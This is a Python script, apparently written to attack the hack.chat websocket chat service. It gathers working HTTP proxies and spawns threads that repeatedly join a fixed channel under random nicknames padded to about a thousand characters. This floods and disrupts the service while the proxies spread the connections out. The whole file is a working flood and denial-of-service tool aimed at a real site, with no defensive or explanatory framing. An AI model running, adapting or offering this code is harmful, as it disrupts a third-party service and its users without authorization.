import re,json,random,time,sys
from threading import Thread
from websocket import create_connection
from inspect import getgeneratorstate

ALL_CONNECT_GENTERATOR = []

proxy = '''

'''

config = {
	"attack_server" : "wss://hack.chat/chat-ws",
	"level" : 3
}

correct_proxy_pattern = r"([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})\:([0-9]{1,5})" 
proxy_list = re.findall(correct_proxy_pattern,proxy)



def adds(func):
	def wrapper(*args,**kwargs):
		generator = func(*args,**kwargs)
		try:
			# the proxy is useful,and have created a useful connection
			# the func will not return the object of websocket connection
			generator.__next__()

		except StopIteration:
			# this proves that the proxy address is useless
			pass

		else:
			# first , add generator to the all_connect_generator
			global ALL_CONNECT_GENTERATOR
			ALL_CONNECT_GENTERATOR.append(generator)

			# second , add proxy to the proxy_list
			global proxy_list
			proxy_list.append((args[1],args[2]))

		finally:
			# print the generator's statu

			pass
			# print(getgeneratorstate(generator))
			# print()

	return wrapper


@ adds
def ready_connection(wsurl,http_proxy_host,http_proxy_port):

	def creating(
		wsurl=wsurl,
		http_proxy_host=http_proxy_host,
		http_proxy_port=http_proxy_port):
		try:
			ws = create_connection(
				wsurl,
				http_proxy_host=http_proxy_host,
				http_proxy_port=http_proxy_port,
				timeout=3)
			print("Proxy Successful: %s %s" % (http_proxy_host,str(http_proxy_port)))
			return ws

		except Exception as error:
			# print("Proxy Failed: %s %s" % (http_proxy_host,str(http_proxy_port)))
			return False

	createdcon = creating()

	if createdcon != False:
		yield 0

		# the attacking request below 
		word_all = "abcdeefhiklmnorstuvwxz_ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		attacker_name = "hack"+"".join([random.choice(word_all) for i in range(random.randint(6,15))]) + "#" + "yo"*500
		createdcon.send(json.dumps({"cmd":"join","channel":"fynoao","nick":attacker_name}))

		# createdcon.send(json.dumps({
		# 	"cmd":"join",
		# 	"channel":"bot",
		# 	"nick":attacker_name,
		# 	"client_key":"XChatYYDS_",
		# 	"murmur":random.choice("abcdeefhiklmnorstuvwxz_ABCDEFGHIJKLMNOPQRSTUVWXYZ")*32,
		# 	"show":1,
		# 	"head":"Im hacker lbw!!!!"}))
		
		createdcon.close()


def load_generator():
	while True:

		global proxy_list

		try:
			proxy_http = (proxy_list[-1][0],int(proxy_list[-1][1]))

		except IndexError:
			pass

		else:
			t_args = (config["attack_server"],*proxy_http)  #"wss://xq.kzw.ink/ws"
			t = Thread(target=ready_connection,args=t_args)
			t.start()
			del proxy_list[-1]


def attacking_exec():
	while True:
		if ALL_CONNECT_GENTERATOR.__len__() >= config["level"]:
			for index,generator in enumerate(ALL_CONNECT_GENTERATOR):
				try:
					generator.send(0)
				except StopIteration:
					del ALL_CONNECT_GENTERATOR[index]

def setup_attack():
	t_load = Thread(target=load_generator)
	t_atta = Thread(target=attacking_exec)

	t_load.start()
	t_atta.start()

setup_attack()